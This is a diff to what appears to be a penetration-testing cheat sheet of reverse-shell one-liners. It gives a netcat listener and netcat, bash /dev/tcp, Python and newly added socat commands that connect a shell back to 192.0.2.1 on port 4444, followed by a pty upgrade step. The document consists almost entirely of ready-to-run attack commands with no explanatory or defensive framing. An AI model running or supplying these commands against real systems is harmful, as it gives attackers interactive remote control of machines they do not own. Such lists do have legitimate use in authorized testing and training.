@@ -1,3 +1,6 @@
+---
+syntax: fish
+---
 # Listen for incoming reverse shell
 nc -lvp 4444
 
@@ -6,10 +9,14 @@ nc -c sh 192.0.2.1 4444
 nc -e /bin/sh 192.0.2.1 4444
 
 # Bash reverse shell
-bash -i &> /dev/tcp/192.0.2.1/4444 0>&1
+bash -c 'bash -i &> /dev/tcp/192.0.2.1/4444 0>&1'
 
 # Python reverse shell, spawns interactive pty
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.0.2.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+
+# Socat reverse shell, spawns fully interactive pty, listen and connect
+socat file:(tty),rawer tcp-listen:4444
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.0.2.1:4444
 
 # Possibilities to upgrade to an interactive pty
 script /dev/null
